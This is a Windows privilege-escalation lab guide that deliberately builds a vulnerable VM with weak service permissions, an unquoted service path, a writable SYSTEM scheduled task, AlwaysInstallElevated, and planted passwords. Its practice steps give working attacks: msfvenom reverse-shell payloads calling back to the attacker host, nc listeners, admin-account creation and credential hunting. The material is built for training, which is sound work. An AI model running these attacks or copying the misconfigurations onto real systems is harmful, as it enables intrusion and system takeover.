# 🛠️ Windows Privilege Escalation — Lab Setup Guide

> **Goal**: Set up a Windows VM with intentional vulnerabilities so you can practice every PrivEsc technique from the main guide.

> **Your Lab**: Kali `192.168.56.10` ↔ Windows Target `192.168.56.30`

---

## 📋 Prerequisites

| Item                                   | Status               |
| -------------------------------------- | -------------------- |
| Kali VM running                        | ✅ Already done       |
| Windows 10/11 Evaluation VM downloaded | ⬜ Do this first      |
| VirtualBox / VMware installed          | ✅ Already done       |
| Network connectivity (ping works)      | ⬜ Verify after setup |

---

## Step 0: Set Up Windows VM in VirtualBox

> This section helps you create your vulnerable Windows target machine.

### 0.1 — Download Windows Evaluation

```
1. Go to: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise
2. Select "ISO – Enterprise" (64-bit)
3. Fill the registration form → Download the ISO
4. The evaluation is FREE for 90 days — that's plenty of time!
```

### 0.2 — Create the VM

```
1. Open VirtualBox → Click "New"
2. Name: "WinTarget"
3. Type: Microsoft Windows
4. Version: Windows 10 (64-bit)
5. RAM: 4096 MB (4 GB minimum)
6. Hard disk: Create a virtual hard disk now → VDI → Dynamically allocated → 50 GB
7. Click "Create"
```

### 0.3 — Configure the VM

```
1. Select the VM → Settings → System:
   - Processor: 2 CPUs
   - Enable PAE/NX

2. Settings → Storage:
   - Click the empty optical drive
   - Choose the Windows ISO you downloaded

3. Settings → Network:
   - Adapter 1: Attached to "Internal Network" → Name: hacklab
   - (Optional) Adapter 2: Attached to "NAT" → For internet during setup only

4. Boot the VM and install Windows
   - Choose "Custom: Install Windows only"
   - Follow the setup wizard
   - Set a password for the Administrator account (e.g., Admin123!)
```

### 0.4 — Set Static IP (On the Windows VM)

```powershell
# Open PowerShell as Administrator on Windows VM
# Find your adapter name first:
Get-NetAdapter

# Set static IP (replace "Ethernet" with your adapter name):
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.56.30 -PrefixLength 24
```

**Verify:**
```cmd
:: On Windows VM
ipconfig

:: On Kali
ping 192.168.56.30
```

---

## Step 1: Create a Low-Privilege Practice User

> You need a **non-admin, low-privilege user** to practice escalating FROM.

```cmd
:: Run as Administrator on Windows VM
net user trainee trainee123 /add
:: Do NOT add to Administrators group — this user stays low-privilege!
```

**Verify:**
```cmd
net user trainee
:: Should show: Local Group Memberships = *Users
:: Should NOT be in the Administrators group

:: Test login:
runas /user:trainee cmd.exe
:: Password: trainee123
whoami
:: Should say: wintarget\trainee
```

---

## Step 2: Set Up Weak Service Permissions

> Create a service that `trainee` (or "Everyone") can modify.

```cmd
:: Run as Administrator

:: 1. Create a directory for the vulnerable service
mkdir "C:\Program Files\Vuln Service"

:: 2. Copy a dummy executable (we'll use cmd.exe as placeholder)
copy C:\Windows\System32\cmd.exe "C:\Program Files\Vuln Service\service.exe"

:: 3. Create the service
sc create VulnService binpath= "\"C:\Program Files\Vuln Service\service.exe\"" start= demand

:: 4. Set weak permissions — Everyone gets full control
sc sdset VulnService "D:(A;;RPWPCCDCLCSWRCWDWOGA;;;WD)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLOCRRC;;;BA)"
```

**Verify (as trainee):**
```cmd
:: Open cmd as trainee
sc qc VulnService
:: Should show the service configuration

:: Check with accesschk (download from Sysinternals first — see Step 8)
accesschk.exe /accepteula -uwcqv "Everyone" VulnService
:: Should show SERVICE_CHANGE_CONFIG (meaning you can modify it!)
```

> 🎯 **Practice as trainee:**
> 1. Check service permissions with `accesschk.exe`
> 2. Reconfigure the service: `sc config VulnService binpath= "cmd.exe /c net user hacker Pass123! /add && net localgroup administrators hacker /add"`
> 3. Restart: `sc stop VulnService && sc start VulnService`
> 4. Check: `net localgroup administrators` → `hacker` should be there!

---

## Step 3: Set Up Unquoted Service Path

> Create a service with a path that has spaces but no quotes.

```cmd
:: Run as Administrator

:: 1. Create the directory structure with spaces
mkdir "C:\Program Files\Unquoted Path Service\Common Files"

:: 2. Copy a dummy executable
copy C:\Windows\System32\cmd.exe "C:\Program Files\Unquoted Path Service\Common Files\service.exe"

:: 3. Create the service WITH an unquoted path (the vulnerability!)
sc create UnquotedSvc binpath= C:\Program Files\Unquoted Path Service\Common Files\service.exe start= demand

:: 4. Give trainee write permission to the directory
icacls "C:\Program Files\Unquoted Path Service" /grant Users:(OI)(CI)F
```

**Verify:**
```cmd
:: Check service path is unquoted
sc qc UnquotedSvc
:: BINARY_PATH_NAME should show the path WITHOUT quotes

:: Check writable directories
icacls "C:\Program Files\Unquoted Path Service"
:: Should show Users with (F) = Full Control
```

> 🎯 **Practice as trainee:**
> 1. Find the unquoted path: `wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """"`
> 2. On Kali, create payload: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe > Common.exe`
> 3. Transfer `Common.exe` to `C:\Program Files\Unquoted Path Service\Common.exe`
> 4. Listen on Kali: `nc -lvnp 4444`
> 5. Restart the service: `sc stop UnquotedSvc && sc start UnquotedSvc`
> 6. Windows tries `Common.exe` before going deeper → reverse shell!

---

## Step 4: Set Up Scheduled Task Exploitation

> Create a SYSTEM-level scheduled task that runs a writable script.

```cmd
:: Run as Administrator

:: 1. Create the tasks directory
mkdir C:\Tasks

:: 2. Create a dummy script
echo echo Backup completed > C:\Tasks\backup.bat

:: 3. Make it writable by Everyone
icacls "C:\Tasks\backup.bat" /grant Everyone:(F)

:: 4. Create a scheduled task that runs as SYSTEM every 5 minutes
schtasks /create /sc minute /mo 5 /tn "BackupTask" /tr "C:\Tasks\backup.bat" /ru SYSTEM /f
```

**Verify:**
```cmd
:: Check the task exists
schtasks /query /tn "BackupTask" /fo LIST /v
:: Should show: Run As User = SYSTEM

:: Check the script is writable
icacls "C:\Tasks\backup.bat"
:: Should show Everyone:(F)
```

> 🎯 **Practice as trainee:**
> 1. Find writable scheduled tasks: `schtasks /query /fo LIST /v | findstr /i "SYSTEM"`
> 2. Check if the script is writable: `icacls C:\Tasks\backup.bat`
> 3. Inject payload: `echo cmd.exe /c net user hacker Pass123! /add > C:\Tasks\backup.bat`
> 4. Append: `echo cmd.exe /c net localgroup administrators hacker /add >> C:\Tasks\backup.bat`
> 5. Wait 5 minutes → check: `net localgroup administrators`

---

## Step 5: Set Up AlwaysInstallElevated

> This registry setting allows any user to install MSI packages as SYSTEM.

```cmd
:: Run as Administrator

:: Enable AlwaysInstallElevated in BOTH hives (both are required!)
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
```

**Verify:**
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both should show: AlwaysInstallElevated    REG_DWORD    0x1
```

> 🎯 **Practice as trainee:**
> 1. Check registry: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
> 2. On Kali: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f msi > evil.msi`
> 3. Transfer `evil.msi` to target
> 4. Listen on Kali: `nc -lvnp 4444`
> 5. On target: `msiexec /quiet /qn /i evil.msi`
> 6. You get a SYSTEM shell!

---

## Step 6: Set Up Credential Hunting Targets

> Plant credentials in common locations for practice finding them.

```cmd
:: Run as Administrator

:: 1. Store a password in the registry
reg add "HKLM\SOFTWARE\VulnApp" /v Password /t REG_SZ /d "SuperSecret123!" /f
reg add "HKLM\SOFTWARE\VulnApp" /v Username /t REG_SZ /d "admin" /f

:: 2. Create a fake Unattend.xml with credentials
mkdir C:\Windows\Panther 2>nul
echo ^<?xml version="1.0"?^> > C:\Windows\Panther\Unattend.xml
echo ^<Credentials^> >> C:\Windows\Panther\Unattend.xml
echo   ^<Username^>Administrator^</Username^> >> C:\Windows\Panther\Unattend.xml
echo   ^<Password^>Admin123!^</Password^> >> C:\Windows\Panther\Unattend.xml
echo ^</Credentials^> >> C:\Windows\Panther\Unattend.xml
icacls "C:\Windows\Panther\Unattend.xml" /grant Users:(R)

:: 3. Create a config file with password
mkdir C:\inetpub\wwwroot 2>nul
echo ^<connectionStrings^> > C:\inetpub\wwwroot\web.config
echo   ^<add connectionString="Server=db;User=admin;Password=DbPass456!" /^> >> C:\inetpub\wwwroot\web.config
echo ^</connectionStrings^> >> C:\inetpub\wwwroot\web.config
icacls "C:\inetpub\wwwroot\web.config" /grant Users:(R)

:: 4. Save a credential in Windows Credential Manager (for cmdkey practice)
cmdkey /add:targetserver /user:admin /pass:SavedCred789!

:: 5. Create a PowerShell history with a password in it
mkdir "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine" 2>nul
echo Invoke-Command -ComputerName server01 -Credential (New-Object PSCredential("admin", (ConvertTo-SecureString "PSHistory123!" -AsPlainText -Force))) >> "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Verify:**
```cmd
:: Check registry
reg query "HKLM\SOFTWARE\VulnApp"
:: Should show Username and Password values

:: Check files
type C:\Windows\Panther\Unattend.xml
type C:\inetpub\wwwroot\web.config

:: Check saved credentials
cmdkey /list
:: Should show the targetserver entry
```

> 🎯 **Practice as trainee:**
> 1. Search registry for passwords: `reg query HKLM /f password /t REG_SZ /s`
> 2. Search for Unattend files: `dir /s /b C:\*nattend.xml 2>nul`
> 3. Search for config files: `findstr /si "password" C:\*.xml C:\*.config C:\*.txt 2>nul`
> 4. Check saved credentials: `cmdkey /list`
> 5. Check PowerShell history: `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

---

## Step 7: Set Up Token Impersonation (SeImpersonatePrivilege)

> Give `trainee` the SeImpersonatePrivilege — simulates a service account.

```cmd
:: Run as Administrator

:: Option A: Add trainee to IIS group (common in real scenarios)
:: IIS service accounts typically have SeImpersonatePrivilege
net localgroup "IIS_IUSRS" trainee /add 2>nul

:: Option B: Use Local Security Policy (GUI method)
:: 1. Run: secpol.msc
:: 2. Go to: Local Policies → User Rights Assignment
:: 3. Find: "Impersonate a client after authentication"
:: 4. Add user: trainee
:: 5. Reboot or log out/in for changes to take effect

:: Option C: Using ntrights (if available)
ntrights +r SeImpersonatePrivilege -u trainee
```

**Verify (as trainee):**
```cmd
whoami /priv
:: Should show: SeImpersonatePrivilege    Enabled
```

> 🎯 **Practice as trainee:**
> 1. Check privileges: `whoami /priv`
> 2. If SeImpersonatePrivilege is Enabled, download PrintSpoofer or GodPotato
> 3. Transfer to target
> 4. Run: `PrintSpoofer.exe -i -c cmd`
> 5. Check: `whoami` → Should be `NT AUTHORITY\SYSTEM`!

---

## Step 8: Download Enumeration Tools to Kali

> Run these **on Kali** to prepare tools for transfer.

```bash
# Create a tools directory
mkdir -p ~/winprivesc_tools && cd ~/winprivesc_tools

# Download WinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat

# Download PowerUp
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# Download PrintSpoofer (for token impersonation)
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe

# Download Accesschk (from Sysinternals - needed for service checks)
wget https://download.sysinternals.com/files/AccessChk.zip
unzip AccessChk.zip

# Download Windows Exploit Suggester
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
```

### Transfer to Windows Target

```bash
# Option 1: HTTP Server (from Kali)
cd ~/winprivesc_tools
python3 -m http.server 8080

# Then on Windows (PowerShell):
# Invoke-WebRequest -Uri http://192.168.56.10:8080/winPEASx64.exe -OutFile C:\temp\winpeas.exe

# Option 2: SMB Server (from Kali — often easier for Windows)
impacket-smbserver share ~/winprivesc_tools -smb2support

# Then on Windows (cmd):
# copy \\192.168.56.10\share\winPEASx64.exe C:\temp\
```

---

## Step 9: Enable Remote Access to Windows VM

> Set up RDP and/or WinRM for easier access from Kali.

```cmd
:: Run as Administrator on Windows VM

:: Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow

:: Enable WinRM (for evil-winrm from Kali)
winrm quickconfig -force
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}

:: Disable Windows Firewall for lab (optional — makes things easier)
netsh advfirewall set allprofiles state off

:: Enable file sharing
netsh advfirewall firewall add rule name="File Sharing" dir=in action=allow protocol=TCP localport=445
```

**Verify (from Kali):**
```bash
# Test RDP
xfreerdp /v:192.168.56.30 /u:trainee /p:trainee123

# Test WinRM
evil-winrm -i 192.168.56.30 -u trainee -p trainee123

# Test SMB
smbclient -L 192.168.56.30 -U trainee
```

---

## 🗺️ Practice Order (Recommended)

| #   | Technique                | Difficulty | Section                          |
| --- | ------------------------ | ---------- | -------------------------------- |
| 1   | Situational Awareness    | 🟢 Easy     | Run all commands from Section 2  |
| 2   | Credential Hunting       | 🟢 Easy     | Search registry, files, cmdkey   |
| 3   | Weak Service Permissions | 🟡 Medium   | accesschk → sc config → restart  |
| 4   | Unquoted Service Paths   | 🟡 Medium   | wmic query → place exe → restart |
| 5   | Scheduled Task Abuse     | 🟡 Medium   | Find writable script → inject    |
| 6   | AlwaysInstallElevated    | 🟡 Medium   | Registry check → MSI payload     |
| 7   | Token Impersonation      | 🔴 Hard     | PrintSpoofer / GodPotato         |
| 8   | DLL Hijacking            | 🔴 Hard     | Process Monitor → craft DLL      |
| 9   | Run WinPEAS & Analyze    | 🟡 Medium   | Find what you missed             |

---

## 🔄 Reset Everything (Start Fresh)

If you want to reset all the changes and start over:

```cmd
:: Run as Administrator

:: Remove trainee user
net user trainee /delete

:: Remove hacker user (if created during practice)
net user hacker /delete 2>nul

:: Remove vulnerable services
sc delete VulnService
sc delete UnquotedSvc

:: Remove scheduled task
schtasks /delete /tn "BackupTask" /f

:: Remove AlwaysInstallElevated
reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
reg delete HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f

:: Remove planted credentials
reg delete "HKLM\SOFTWARE\VulnApp" /f
cmdkey /delete:targetserver
del C:\Windows\Panther\Unattend.xml 2>nul
del C:\inetpub\wwwroot\web.config 2>nul

:: Remove directories
rmdir /s /q "C:\Program Files\Vuln Service"
rmdir /s /q "C:\Program Files\Unquoted Path Service"
rmdir /s /q C:\Tasks
rmdir /s /q C:\temp

:: Re-enable firewall
netsh advfirewall set allprofiles state on
```

---

> 🔙 **Back to**: [Windows PrivEsc Main Guide](./windows_privesc.md)
> 🔙 **Previous Phase**: [Phase 4 — Linux PrivEsc](../phase_4_linux_privesc/linux_privesc.md)
